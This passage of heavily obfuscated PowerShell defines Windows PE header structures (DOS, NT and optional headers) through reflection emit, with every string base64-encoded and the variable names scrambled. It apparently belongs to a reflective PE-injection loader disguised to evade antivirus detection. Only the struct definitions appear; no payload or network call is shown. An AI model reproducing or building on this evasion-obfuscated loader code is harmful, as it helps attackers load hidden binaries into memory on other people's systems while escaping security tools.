		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA=='))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(160) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(168) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwAUAB0AHIA'))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(176) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABMAFMAVABhAGIAbABlAA=='))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(184) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABDAG8AbgBmAGkAZwBUAGEAYgBsAGUA'))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(192) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAEkAbQBwAG8AcgB0AA=='))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(200) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAFQA'))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(208) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AEkAbQBwAG8AcgB0AEQAZQBzAGMAcgBpAHAAdABvAHIA'))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(216) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAFIAUgB1AG4AdABpAG0AZQBIAGUAYQBkAGUAcgA='))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(224) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(232) | Out-Null
		${__/\__/\_/\_/=\/\} = ${/===\/==\_/==\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value ${__/\__/\_/\_/=\/\}
		${_/=\_/===\_/\/=\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${/===\/==\_/==\/\_} = ${_/\/\__/==\/\_/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATwBQAFQASQBPAE4AQQBMAF8ASABFAEEARABFAFIAMwAyAA=='))), ${_/=\_/===\_/\/=\/}, [System.ValueType], 224)
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAA=='))), ${/====\/\_/=\/\__/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(2) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(3) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBuAGkAdABpAGEAbABpAHoAZQBkAEQAYQB0AGEA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(8) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAVQBuAGkAbgBpAHQAaQBhAGwAaQB6AGUAZABEAGEAdABhAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(12) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARQBuAHQAcgB5AFAAbwBpAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(16) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(20) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(24) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAGEAZwBlAEIAYQBzAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(28) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdABpAG8AbgBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(32) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(36) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(40) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(42) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(44) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(46) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(48) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(50) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAFYAZQByAHMAaQBvAG4AVgBhAGwAdQBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(52) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(56) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(60) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFMAdQBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(64) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAcwB5AHMAdABlAG0A'))), ${/===\__/\/\/\/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(68) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), ${_/\_/\___/\__/=\/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(70) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAFIAZQBzAGUAcgB2AGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(72) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAEMAbwBtAG0AaQB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(76) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABSAGUAcwBlAHIAdgBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(80) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABDAG8AbQBtAGkAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(84) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABlAHIARgBsAGEAZwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(88) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAdgBhAEEAbgBkAFMAaQB6AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(92) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbwByAHQAVABhAGIAbABlAA=='))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(96) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAVABhAGIAbABlAA=='))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(104) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwB1AHIAYwBlAFQAYQBiAGwAZQA='))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(112) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AVABhAGIAbABlAA=='))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(120) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBlAHIAdABpAGYAaQBjAGEAdABlAFQAYQBiAGwAZQA='))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(128) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBSAGUAbABvAGMAYQB0AGkAbwBuAFQAYQBiAGwAZQA='))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(136) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA=='))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(144) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(152) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwAUAB0AHIA'))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(160) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABMAFMAVABhAGIAbABlAA=='))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(168) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABDAG8AbgBmAGkAZwBUAGEAYgBsAGUA'))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(176) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAEkAbQBwAG8AcgB0AA=='))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(184) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAFQA'))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(192) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AEkAbQBwAG8AcgB0AEQAZQBzAGMAcgBpAHAAdABvAHIA'))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(200) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAFIAUgB1AG4AdABpAG0AZQBIAGUAYQBkAGUAcgA='))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(208) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(216) | Out-Null
		${_/\____/=\_/=\__/} = ${/===\/==\_/==\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value ${_/\____/=\_/=\__/}
		${_/=\_/===\_/\/=\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${/===\/==\_/==\/\_} = ${_/\/\__/==\/\_/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ASABFAEEARABFAFIAUwA2ADQA'))), ${_/=\_/===\_/\/=\/}, [System.ValueType], 264)
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBIAGUAYQBkAGUAcgA='))), ${_/=\__/=\/=\_/\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), ${__/\__/\_/\_/=\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/===\___/\/\_/\} = ${/===\/==\_/==\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value ${__/===\___/\/\_/\}
		${_/=\_/===\_/\/=\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${/===\/==\_/==\/\_} = ${_/\/\__/==\/\_/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ASABFAEEARABFAFIAUwAzADIA'))), ${_/=\_/===\_/\/=\/}, [System.ValueType], 248)
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBIAGUAYQBkAGUAcgA='))), ${_/=\__/=\/=\_/\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), ${_/\____/=\_/=\__/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\/==\_/=\___/\/} = ${/===\/==\_/==\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value ${/=\/==\_/=\___/\/}
		${_/=\_/===\_/\/=\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${/===\/==\_/==\/\_} = ${_/\/\__/==\/\_/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABPAFMAXwBIAEUAQQBEAEUAUgA='))), ${_/=\_/===\_/\/=\/}, [System.ValueType], 64)
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AYQBnAGkAYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAYgBsAHAA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcgBsAGMA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcABhAHIAaABkAHIA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AaQBuAGEAbABsAG8AYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AYQB4AGEAbABsAG8AYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHMAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHMAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcwB1AG0A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGkAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGwAZgBhAHIAbABjAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AdgBuAG8A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/==\__/\/\__/\/=} = ${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHIAZQBzAA=='))), [UInt16[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${_/==\____/\____/=} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${/=\____/=\_/\/=\_} = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBDAG8AbgBzAHQA')))))
		${__/\/=\/=\/\_/\__} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${/=\/====\/=\_/=\/}, ${_/==\____/\____/=}, ${/=\____/=\_/\/=\_}, @([Int32] 4))
		${_/==\__/\/\__/\/=}.SetCustomAttribute(${__/\/=\/=\/\_/\__})
